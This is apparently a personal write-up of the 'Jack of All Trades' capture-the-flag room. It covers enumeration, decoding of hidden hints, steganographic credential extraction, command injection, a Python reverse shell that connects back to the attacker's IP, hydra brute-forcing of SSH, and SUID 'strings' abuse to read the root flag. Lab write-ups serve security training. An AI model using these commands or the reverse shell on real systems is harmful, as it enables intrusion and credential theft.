## A. Enumeration

### Nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 
80/tcp open  ssh     OpenSSH 6.7p1 Debian S: Linux; CPE: cpe:/o:linux:linux_kerne
```

ports for ssh and http are reversed

### HTTP

1. Firefox returned an error when trying to visit < IP >:22  
![[Pasted image 20230723205407.png]]

2. Made the following changes :
    1. entered `about:config` in a new tab
    2. searched for `network.security.ports.banned.override`
    3. select `string` and the `+` icon next to it
    4. add `22` in the input and done
3. The source code of index had interesting comments
```
/recovery.php!

UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==
```

When decoded the above strings with base64 we get

```
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

4. `http://10.10.12.11:22/recovery.php` returned a login page, the source code of this page also had an encoded string
```
GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=
```

5. Decoded the strings "from base32" to "from hex" to "from rot13" and we get the below strings

![[Pasted image 20230723210440.png]]

```
Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```

6. Short link leads to `https://en.wikipedia.org/wiki/Stegosauria` , this maybe a hint that passwords is hidden in the dinosaur image at the index.html
7. Ran a `feroxbuster` command to check the the image was located `http://10.10.12.11:22/assets/
8. Downloaded the image
```
┌─[✗]─[glack@parrot]─[~/Desktop/THM/jack-of-all-trades]
└──╼ $wget http://10.10.12.11:22/assets/stego.jpg
--2023-07-23 21:08:19--  http://10.10.12.11:22/assets/stego.jpg
```
9. `steghide` revealed iamge had something hidden in it
```
─[glack@parrot]─[~/Desktop/THM/jack-of-all-trades]
└──╼ $steghide extract -sf stego.jpg 
wrote extracted data to "creds.txt"
```
passphrase was the above one we found: 
`u?WtKSraq`

10. `cat creds.txt`
    1. ``` Hehe. Gotcha!

You're on the right path, but wrong image!```


11. Now trying with a different image
```
─[✗]─[glack@parrot]─[~/Desktop/THM/jack-of-all-trades]
└──╼ $steghide extract -sf header.jpg 
Enter passphrase: 
wrote extracted data to "cms.creds".
```

12. We get another set of credentials
```
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY

```

13. We are able to login into /recovery.php with these creds, we are shown this text message
```
GET me a 'cmd' and I'll run it for you Future-Jack.
```

## B. Foothold

1. Maybe cmd is an paramater here with our desired command we wish to run
2. Great, we were right. upon running 

```
http://10.10.12.11:22/nnxhweOV/index.php?cmd=id 
```

we get the results of `id` command

3. Lets check if python is installed so we can try to get a reverse shell using python
```
http://10.10.12.11:22/nnxhweOV/index.php?cmd=which%20python
```
4. Python is installed, created a reverseshell command using shellgen
```
┌─[glack@parrot]─[~/Desktop/shellgen]
└──╼ $./shellgen tun0 9999 3

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.24.189",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
5. intercepted the request using burp, changed the `cmd` paramter value to `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.24.189",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
6. started a netcat listener before sending the request from burpsuite
```
─[glack@parrot]─[~/Desktop/shellgen]
└──╼ $nc -lnvp 9999
```
7. We get a shell
```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Priv ESC

### 1. Horizontal Priv Esc

1. In the home directory there is a file with potential jack's passwords 
```
-rw-r--r--  1 root root  408 Feb 29  2020 jacks_password_list
```
2. We copy the contents into our local machine and use hydra to perform a wordlist attack or target ssh

```
─[glack@parrot]─[~/Desktop/THM/jack-of-all-trades]
└──╼ $hydra -l jack -P jac_pass.txt 10.10.12.11 ssh -s 80
```

here jac_pass.txt is the potential jack's password list that we found.

3. We get jack's credentials, we can now ssh into target machine using 
```
80][ssh] host: 10.10.12.11   login: jack   password: ITMJpGGIqg1jn?>@
```

### 2. Vertical Priv Esc 

1. we see a user.jpg file in the jack's home directory, we download it on to our system using

```
jack@jack-of-all-trades:~$ python -m SimpleHTTPServer 8000
```

```
┌─[glack@parrot]─[~/Desktop/THM/jack-of-all-trades]
└──╼ $wget http://10.10.12.11:8000/user.jpg
```

2. upon inspecting the contents of the image, we can see a string with flag like format. I manually wrote it and check to see if this is actually the user flag and it worked, we successfully found the user flag
```
securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}
```

3. the SUID bits revealed strings can be run as owner(root)

    Used the write up here because i missed `strings` in my standard process

```
jack@jack-of-all-trades:~$ find / -type f -perm -4000 -ls 2>/dev/null

133270   28 -rwsr-x---   1 root     dev         27536 Feb 25  2015 /usr/bin/strings
```

with this we can easily get the root flag

```
jack@jack-of-all-trades:~$ strings /root/root.txt

6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}

```